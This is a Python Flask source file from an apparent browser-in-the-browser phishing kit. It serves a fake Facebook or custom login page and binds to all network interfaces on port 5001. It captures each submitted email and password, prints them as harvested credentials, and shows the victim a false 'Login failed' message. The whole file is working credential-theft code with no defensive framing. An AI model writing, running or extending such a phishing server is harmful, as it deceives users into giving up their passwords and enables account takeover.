from flask import Flask, render_template, request

app = Flask(__name__, template_folder="../templates", static_folder="../static")

selected_site = "bitb_facebook.html"
custom_target_url = ""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        print(f"[+] BitB Credentials: {email} | {password}")
        return "<h3>Login failed. Please try again.</h3>"

    if selected_site == "bitb_custom.html":
        return render_template(selected_site, target_url=custom_target_url)
    else:
        return render_template(selected_site)

def start_bitb_dynamic(site_name, custom_url):
    global selected_site, custom_target_url
    selected_site = site_name
    custom_target_url = custom_url or ""
    print(f"[*] BitB phishing page running: {site_name}")
    print("[*] Open http://localhost:5001")
    app.run(host="0.0.0.0", port=5001)

